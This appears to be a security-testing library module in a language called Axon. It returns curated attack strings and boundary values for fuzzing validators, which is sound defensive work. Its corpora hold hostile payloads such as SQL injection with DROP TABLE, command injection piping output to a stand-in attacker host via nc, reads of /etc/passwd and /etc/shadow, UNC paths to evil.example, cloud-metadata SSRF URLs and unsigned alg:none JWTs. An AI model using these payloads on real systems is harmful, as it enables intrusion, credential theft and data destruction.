// Axon Deep Security Testing Library — Adversarial Attack Corpora & Boundary Generators (`std/sec_corpus.ax`)
// 100% Pure Axon, Zero-GC, Zero External Dependencies, `--shield` Safe.
// Provides curated OWASP ASVS / CWE Top 25 attack suites and numeric/encoding/DoS boundary generators:
//   - Integer & IEEE-754 float boundary vectors (CWE-190, CWE-369, CWE-681)
//   - SQL Injection (CWE-89) & OS Command Injection (CWE-78)
//   - Path Traversal, Windows Drive/UNC & NUL Truncation (CWE-22, CWE-40, CWE-158)
//   - SSRF & RFC-3986 URL Authority/IP-Encoding Bypasses (CWE-918)
//   - HTTP Request Smuggling & Header Injection (CWE-444, CWE-113)
//   - JWT Downgrade, Signature Confusion & Temporal Claim Attacks (CWE-347, CWE-287)
//   - HTML/XSS/CSS/Tailwind/JS Adversarial & Deep Nesting Bombs (CWE-79, CWE-400)
//   - Hostile UTF-8 / Overlong / Surrogate / Encoding Abuse (CWE-176)
//   - ReDoS & Parser Backtracking Bombs (CWE-1333) + Fuzzer Dictionary Tokens

use std::str
use std::ds

fn _corpus_bytes2(a: i64, b: i64) -> str {
    buf := buf_new(8)
    buf_push(buf, a & 255)
    buf_push(buf, b & 255)
    return buf_to_owned_str(move buf)
}

fn _corpus_bytes3(a: i64, b: i64, c: i64) -> str {
    buf := buf_new(8)
    buf_push(buf, a & 255)
    buf_push(buf, b & 255)
    buf_push(buf, c & 255)
    return buf_to_owned_str(move buf)
}

fn _corpus_bytes4(a: i64, b: i64, c: i64, d: i64) -> str {
    buf := buf_new(8)
    buf_push(buf, a & 255)
    buf_push(buf, b & 255)
    buf_push(buf, c & 255)
    buf_push(buf, d & 255)
    return buf_to_owned_str(move buf)
}

fn _corpus_with_nul(prefix: str, suffix: str) -> str {
    buf := buf_new(str_len(prefix) + str_len(suffix) + 8)
    buf_push_str(buf, prefix)
    buf_push(buf, 0)
    buf_push_str(buf, suffix)
    return buf_to_owned_str(move buf)
}

// --- 1. Numeric & IEEE-754 Float Boundary Vectors (CWE-190 / CWE-369 / CWE-681) ---

// Returns 40+ hostile signed 64-bit boundary integers covering zero, powers of two +/- 1,
// 8/16/32/64-bit signed & unsigned limits, and INT64_MIN / INT64_MAX.
fn corpus_i64_boundaries() -> IntBuf {
    i64_min := 1 << 63
    i64_max := i64_min -% 1
    v := ibuf_new(64)
    ibuf_push(v, 0)
    ibuf_push(v, 1)
    ibuf_push(v, -1)
    ibuf_push(v, 2)
    ibuf_push(v, -2)
    ibuf_push(v, 7)
    ibuf_push(v, -7)
    ibuf_push(v, 8)
    ibuf_push(v, -8)
    ibuf_push(v, 15)
    ibuf_push(v, 16)
    ibuf_push(v, -16)
    ibuf_push(v, 31)
    ibuf_push(v, 32)
    ibuf_push(v, 63)
    ibuf_push(v, 64)
    ibuf_push(v, -64)
    ibuf_push(v, 127)
    ibuf_push(v, 128)
    ibuf_push(v, -128)
    ibuf_push(v, 255)
    ibuf_push(v, 256)
    ibuf_push(v, -256)
    ibuf_push(v, 32767)
    ibuf_push(v, 32768)
    ibuf_push(v, -32768)
    ibuf_push(v, 65535)
    ibuf_push(v, 65536)
    ibuf_push(v, 1048576)
    ibuf_push(v, 2147483647)
    ibuf_push(v, -2147483648)
    ibuf_push(v, 4294967295)
    ibuf_push(v, 4294967296)
    ibuf_push(v, 1 << 62)
    ibuf_push(v, 0 -% (1 << 62))
    ibuf_push(v, i64_min)
    ibuf_push(v, i64_min +% 1)
    ibuf_push(v, i64_max)
    ibuf_push(v, i64_max -% 1)
    return v
}

// Reinterprets an IEEE-754 binary64 bit pattern (`i64`) as `f64` safely.
fn sec_f64_from_bits(bits: i64) -> f64 {
    unsafe {
        p := mem_alloc_aligned(16)
        if p == 0 { return 0.0 }
        ptr_write_i64(p, 0, bits)
        res := ptr_read_f64(p, 0)
        mem_free_aligned(p)
        return res
    }
}

// Reinterprets an `f64` as its raw IEEE-754 binary64 bit pattern (`i64`).
fn sec_f64_to_bits(val: f64) -> i64 {
    unsafe {
        p := mem_alloc_aligned(16)
        if p == 0 { return 0 }
        ptr_write_f64(p, 0, val)
        bits := ptr_read_i64(p, 0)
        mem_free_aligned(p)
        return bits
    }
}

// Returns IEEE-754 bit patterns for hostile floats: +0.0, -0.0, +1.0, -1.0, subnormal min,
// max finite, -max finite, +Inf, -Inf, qNaN, negative qNaN, signaling-like NaN payload.
fn corpus_f64_edge_bits() -> IntBuf {
    v := ibuf_new(16)
    ibuf_push(v, 0x0000000000000000)                  // +0.0
    ibuf_push(v, 1 << 63)                             // -0.0
    ibuf_push(v, 0x3FF0000000000000)                  // +1.0
    ibuf_push(v, (1 << 63) | 0x3FF0000000000000)      // -1.0
    ibuf_push(v, 0x0000000000000001)                  // min positive subnormal
    ibuf_push(v, (1 << 63) | 0x0000000000000001)      // max negative subnormal
    ibuf_push(v, 0x7FEFFFFFFFFFFFFF)                  // DBL_MAX
    ibuf_push(v, (1 << 63) | 0x7FEFFFFFFFFFFFFF)      // -DBL_MAX
    ibuf_push(v, 0x7FF0000000000000)                  // +Inf
    ibuf_push(v, (1 << 63) | 0x7FF0000000000000)      // -Inf
    ibuf_push(v, 0x7FF8000000000000)                  // qNaN
    ibuf_push(v, (1 << 63) | 0x7FF8000000000001)      // -qNaN
    return v
}

// --- 2. SQL Injection & Command Injection Corpora (CWE-89, CWE-78) ---

fn corpus_sqli() -> StrVec {
    mut sv := svec_new(32, 1024)
    svec_push(mut sv, "' OR '1'='1")
    svec_push(mut sv, "' OR 1=1--")
    svec_push(mut sv, "\" OR \"1\"=\"1")
    svec_push(mut sv, "admin'--")
    svec_push(mut sv, "admin'/*")
    svec_push(mut sv, "1; DROP TABLE users;--")
    svec_push(mut sv, "1 UNION SELECT NULL,NULL--")
    svec_push(mut sv, "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--")
    svec_push(mut sv, "') OR ('1'='1")
    svec_push(mut sv, "1; WAITFOR DELAY '0:0:5'--")
    svec_push(mut sv, "users; ATTACH DATABASE '/tmp/pwn.db' AS pwn;--")
    svec_push(mut sv, "0_leading_digit")
    svec_push(mut sv, "table name with spaces")
    svec_push(mut sv, "")
    svec_push(mut sv, _corpus_with_nul("users", "'; DROP TABLE x"))
    return sv
}

fn corpus_cmd_injection() -> StrVec {
    mut sv := svec_new(32, 1024)
    svec_push(mut sv, "foo; id")
    svec_push(mut sv, "foo && whoami")
    svec_push(mut sv, "foo || cat /etc/passwd")
    svec_push(mut sv, "foo | nc attacker 4444")
    svec_push(mut sv, "$(whoami)")
    svec_push(mut sv, "`id`")
    svec_push(mut sv, "foo > /tmp/pwn")
    svec_push(mut sv, "foo < /etc/shadow")
    svec_push(mut sv, "foo\nwhoami")
    svec_push(mut sv, "foo\r\ncalc.exe")
    svec_push(mut sv, "foo & calc.exe")
    svec_push(mut sv, "%COMSPEC% /c dir")
    svec_push(mut sv, "' ; id #")
    svec_push(mut sv, "\" ; id #")
    svec_push(mut sv, "")
    svec_push(mut sv, _corpus_with_nul("safe", ";id"))
    return sv
}

// --- 3. Path Traversal, UNC & NUL Truncation Corpus (CWE-22, CWE-40, CWE-158) ---

fn corpus_path_traversal() -> StrVec {
    mut sv := svec_new(32, 1024)
    svec_push(mut sv, "../etc/passwd")
    svec_push(mut sv, "../../../../etc/passwd")
    svec_push(mut sv, "..\\..\\Windows\\win.ini")
    svec_push(mut sv, "/etc/passwd")
    svec_push(mut sv, "\\Windows\\System32\\cmd.exe")
    svec_push(mut sv, "C:/Windows/win.ini")
    svec_push(mut sv, "C:\\Windows\\win.ini")
    svec_push(mut sv, "\\\\evil.example\\share\\ntlm")
    svec_push(mut sv, "//evil.example/share/ntlm")
    svec_push(mut sv, "\\\\?\\C:\\Windows\\win.ini")
    svec_push(mut sv, "a/../../secret.key")
    svec_push(mut sv, "a/./../secret.key")
    svec_push(mut sv, "....//....//etc/passwd")
    svec_push(mut sv, "%2e%2e%2fetc%2fpasswd")
    svec_push(mut sv, "%252e%252e%252fetc%252fpasswd")
    svec_push(mut sv, "safe/dir/.")
    svec_push(mut sv, "safe/dir/..")
    svec_push(mut sv, ".hidden")
    svec_push(mut sv, "foo//bar")
    svec_push(mut sv, "foo:bar")
    svec_push(mut sv, _corpus_with_nul("safe.txt", ".png"))
    svec_push(mut sv, ".." + _corpus_bytes2(0xC0, 0xAF) + "etc/passwd")
    svec_push(mut sv, "")
    return sv
}

// --- 4. SSRF & URL Authority Confusion Corpus (CWE-918) ---

fn corpus_ssrf_urls() -> StrVec {
    mut sv := svec_new(40, 2048)
    svec_push(mut sv, "http://127.0.0.1/")
    svec_push(mut sv, "http://127.0.0.1:8080/admin")
    svec_push(mut sv, "http://127.1/")
    svec_push(mut sv, "http://127.0.1/")
    svec_push(mut sv, "http://0.0.0.0/")
    svec_push(mut sv, "http://0/")
    svec_push(mut sv, "http://localhost/")
    svec_push(mut sv, "http://localhost./")
    svec_push(mut sv, "http://sub.localhost/")
    svec_push(mut sv, "http://169.254.169.254/latest/meta-data/")
    svec_push(mut sv, "http://10.0.0.1/internal")
    svec_push(mut sv, "http://172.16.0.1/internal")
    svec_push(mut sv, "http://172.31.255.254/internal")
    svec_push(mut sv, "http://192.168.1.1/router")
    svec_push(mut sv, "http://100.64.0.1/cgnat")
    svec_push(mut sv, "http://[::1]/")
    svec_push(mut sv, "http://[0:0:0:0:0:0:0:1]/")
    svec_push(mut sv, "http://[::]/")
    svec_push(mut sv, "http://[::ffff:127.0.0.1]/")
    svec_push(mut sv, "http://[::ffff:7f00:1]/")
    svec_push(mut sv, "http://[::ffff:a9fe:a9fe]/")       // hex IPv4-mapped IMDS 169.254.169.254
    svec_push(mut sv, "http://[::ffff:192.168.1.1]/")
    svec_push(mut sv, "http://[fe80::1]/")
    svec_push(mut sv, "http://[fe90::1]/")                // fe80::/10 link-local range
    svec_push(mut sv, "http://[fc00::1]/")
    svec_push(mut sv, "http://[fd12:3456::1]/")
    svec_push(mut sv, "http://2130706433/")               // decimal 127.0.0.1
    svec_push(mut sv, "http://0x7f000001/")               // hex 127.0.0.1
    svec_push(mut sv, "http://0x7f.0x0.0x0.0x1/")         // dotted hex
    svec_push(mut sv, "http://0177.0.0.1/")               // octal 127.0.0.1
    svec_push(mut sv, "http://017700000001/")             // single octal
    svec_push(mut sv, "http://2852039166/")               // decimal 169.254.169.254
    svec_push(mut sv, "http://public.example.com@127.0.0.1/")
    svec_push(mut sv, "http://a@public.example.com@localhost/")
    svec_push(mut sv, "http://127.0.0.1\\@public.example.com/")
    svec_push(mut sv, "http://127.0.0.1#@public.example.com/")
    svec_push(mut sv, "http://127.0.0.1?@public.example.com/")
    svec_push(mut sv, "http://public.example.com\\@127.0.0.1/")
    svec_push(mut sv, "file:///etc/passwd")
    svec_push(mut sv, "gopher://127.0.0.1:6379/_INFO")
    svec_push(mut sv, "ftp://127.0.0.1/")
    svec_push(mut sv, "javascript:alert(1)")
    svec_push(mut sv, "http://example.com\r\nX-Injected: 1")
    svec_push(mut sv, "http://example.com:99999/")
    svec_push(mut sv, "http://example.com:-1/")
    svec_push(mut sv, "http://[::1/")
    return sv
}

// --- 5. HTTP Request Smuggling & Header Injection Corpus (CWE-444, CWE-113) ---

fn corpus_http_smuggling() -> StrVec {
    mut sv := svec_new(24, 2048)
    svec_push(mut sv, "GET / HTTP/1.1\nHost: a\n\n")
    svec_push(mut sv, "GET / HTTP/1.1\nHost: a\r\n\r\n")
    svec_push(mut sv, "POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
    svec_push(mut sv, "POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX")
    svec_push(mut sv, "POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 5\r\nContent-Length: 10\r\n\r\nhello")
    svec_push(mut sv, "GET / HTTP/1.1\r\nHost : evil.com\r\n\r\n")
    svec_push(mut sv, "GET / HTTP/1.1\r\nHost: a\r\n folded: value\r\n\r\n")
    svec_push(mut sv, "GET /../../etc/passwd HTTP/1.1\r\nHost: a\r\n\r\n")
    svec_push(mut sv, "GET / HTTP/1.1\r\nHost: a\r\nX-Test: a\r\nInjected: b\r\n\r\n")
    svec_push(mut sv, "GET / HTTP/0.9\r\n\r\n")
    svec_push(mut sv, "   \r\n\r\n")
    svec_push(mut sv, "")
    svec_push(mut sv, _corpus_with_nul("GET /ok", " HTTP/1.1\r\nHost: a\r\n\r\n"))
    return sv
}

// --- 6. JWT Attack Corpus (CWE-347, CWE-287) ---

fn corpus_jwt_attacks() -> StrVec {
    mut sv := svec_new(24, 2048)
    // alg:none with empty signature
    svec_push(mut sv, "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.")
    // alg:none with non-empty fake signature
    svec_push(mut sv, "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.ZmFrZQ")
    // alg:None mixed case
    svec_push(mut sv, "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.ZmFrZQ")
    // alg:RS256 algorithm confusion
    svec_push(mut sv, "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.ZmFrZQ")
    // alg:HS512 downgrade/mismatch
    svec_push(mut sv, "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.ZmFrZQ")
    // Structural malformations: 1, 2, 4 segments, leading/trailing dots, invalid b64url
    svec_push(mut sv, "not_a_jwt")
    svec_push(mut sv, "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhIn0")
    svec_push(mut sv, "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhIn0.c2ln.extra")
    svec_push(mut sv, ".eyJzdWIiOiJhIn0.c2ln")
    svec_push(mut sv, "eyJhbGciOiJIUzI1NiJ9..c2ln")
    svec_push(mut sv, "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhIn0.")
    svec_push(mut sv, "!!!.@@@.###")
    svec_push(mut sv, "")
    return sv
}

// --- 7. HTML/XSS/CSS Adversarial & Encoding Corpora (CWE-79, CWE-176) ---

fn corpus_xss_html_css() -> StrVec {
    mut sv := svec_new(24, 2048)
    svec_push(mut sv, "<script>alert(1)</script>")
    svec_push(mut sv, "<img src=x onerror=alert(1)>")
    svec_push(mut sv, "<svg/onload=alert(1)>")
    svec_push(mut sv, "<a href=\"javascript:alert(1)\">x</a>")
    svec_push(mut sv, "<div \"a>b\"><span id=\"ok\">x</span></div>")
    svec_push(mut sv, "<!-- unclosed comment <div id=\"x\">")
    svec_push(mut sv, "<div id=\"unclosed attr>text")
    svec_push(mut sv, "<<<<<<<<<<>>>>>>>>>>")
    svec_push(mut sv, "</closing></without></open>")
    svec_push(mut sv, ":root { --a: var(--b); --b: var(--a); } div { color: var(--a); }")
    svec_push(mut sv, "div { width: -999999999rem; height: 999999999rem; }")
    svec_push(mut sv, "div * * * * * * * * * * p { color: #ff0000; }")
    svec_push(mut sv, "@media (min-width: -1px) { @media (max-width: 999999999px) { div { } } }")
    return sv
}

fn corpus_utf8_encoding() -> StrVec {
    mut sv := svec_new(24, 512)
    svec_push(mut sv, "")
    svec_push(mut sv, _corpus_bytes2(0x00, 0x00))                   // NULs
    svec_push(mut sv, _corpus_bytes2(0xC0, 0xAF))                   // Overlong '/'
    svec_push(mut sv, _corpus_bytes2(0xC0, 0x80))                   // Overlong NUL
    svec_push(mut sv, _corpus_bytes3(0xE0, 0x80, 0xAF))             // 3-byte overlong '/'
    svec_push(mut sv, _corpus_bytes4(0xF0, 0x80, 0x80, 0xAF))       // 4-byte overlong '/'
    svec_push(mut sv, _corpus_bytes3(0xED, 0xA0, 0x80))             // UTF-16 high surrogate
    svec_push(mut sv, _corpus_bytes3(0xED, 0xBF, 0xBF))             // UTF-16 low surrogate
    svec_push(mut sv, _corpus_bytes2(0xFF, 0xFE))                   // Invalid UTF-8 / UTF-16 BOM
    svec_push(mut sv, _corpus_bytes3(0xEF, 0xBB, 0xBF))             // UTF-8 BOM
    svec_push(mut sv, _corpus_bytes3(0xE2, 0x80, 0xAE))             // U+202E RTL override
    svec_push(mut sv, _corpus_bytes2(0xC2, 0x00))                   // Truncated 2-byte + NUL
    svec_push(mut sv, _corpus_bytes3(0xF4, 0x90, 0x80))             // > U+10FFFF out of range
    svec_push(mut sv, "\\u0000\\x00\\")                              // Trailing escape
    svec_push(mut sv, "%")                                          // Truncated percent-encoding
    svec_push(mut sv, "%ZZ%2")                                      // Invalid percent-encoding
    svec_push(mut sv, "====")                                       // Invalid base64 padding
    return sv
}

// --- 8. Algorithmic Complexity / Deep Nesting / ReDoS Generators (CWE-400, CWE-1333) ---

// Generates `depth` nested pairs: `open * depth + mid + close * depth` (clamped at 4096).
fn corpus_gen_nested(open_tok: str, close_tok: str, mid: str, depth: i64) -> str {
    mut d := depth
    if d < 0 { d = 0 }
    if d > 4096 { d = 4096 }
    est := d * (str_len(open_tok) + str_len(close_tok)) + str_len(mid) + 16
    b := buf_new(est)
    mut i := 0
    while i < d {
        buf_push_str(b, open_tok)
        i += 1
    }
    buf_push_str(b, mid)
    i = 0
    while i < d {
        buf_push_str(b, close_tok)
        i += 1
    }
    return buf_to_owned_str(move b)
}

// Generates `unit * count + suffix` (useful for ReDoS and quadratic parser scaling probes).
fn corpus_gen_repeat(unit: str, count: i64, suffix: str = "") -> str {
    mut c := count
    if c < 0 { c = 0 }
    if c > 65536 { c = 65536 }
    est := c * str_len(unit) + str_len(suffix) + 16
    b := buf_new(est)
    mut i := 0
    while i < c {
        buf_push_str(b, unit)
        i += 1
    }
    buf_push_str(b, suffix)
    return buf_to_owned_str(move b)
}

fn corpus_redos_patterns() -> StrVec {
    mut sv := svec_new(16, 512)
    svec_push(mut sv, "(a+)+$")
    svec_push(mut sv, "([a-zA-Z]+)*$")
    svec_push(mut sv, "(a|aa)+$")
    svec_push(mut sv, ".*.*.*.*.*.*.*.*X")
    svec_push(mut sv, "a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?aaaaaaaaaaaaaaaaaaaa")
    svec_push(mut sv, "[a-z")
    svec_push(mut sv, "((((((((((a")
    svec_push(mut sv, "*invalid")
    svec_push(mut sv, "\\")
    return sv
}

// High-signal parser/protocol dictionary tokens for greybox fuzzing (`std::sec_fuzz`).
fn corpus_parser_dict() -> StrVec {
    mut sv := svec_new(64, 1024)
    svec_push(mut sv, "://")
    svec_push(mut sv, "../")
    svec_push(mut sv, "..\\")
    svec_push(mut sv, "\r\n\r\n")
    svec_push(mut sv, "\n")
    svec_push(mut sv, "\r\n")
    svec_push(mut sv, "http://127.0.0.1")
    svec_push(mut sv, "[::1]")
    svec_push(mut sv, "@")
    svec_push(mut sv, "#")
    svec_push(mut sv, "?")
    svec_push(mut sv, "%2e")
    svec_push(mut sv, "%00")
    svec_push(mut sv, "Content-Length: ")
    svec_push(mut sv, "Transfer-Encoding: chunked")
    svec_push(mut sv, "HTTP/1.1")
    svec_push(mut sv, "{\"")
    svec_push(mut sv, "\":")
    svec_push(mut sv, "null")
    svec_push(mut sv, "true")
    svec_push(mut sv, "-9223372036854775808")
    svec_push(mut sv, "9999999999999999999999999")
    svec_push(mut sv, "\\\"")
    svec_push(mut sv, "\\\\")
    svec_push(mut sv, "<div>")
    svec_push(mut sv, "</div>")
    svec_push(mut sv, "var(--")
    svec_push(mut sv, "alg")
    svec_push(mut sv, "none")
    svec_push(mut sv, "HS256")
    svec_push(mut sv, "' OR 1=1--")
    svec_push(mut sv, "/*")
    svec_push(mut sv, "*/")
    svec_push(mut sv, _corpus_bytes2(0x00, 0xFF))
    svec_push(mut sv, _corpus_bytes2(0xC0, 0xAF))
    return sv
}
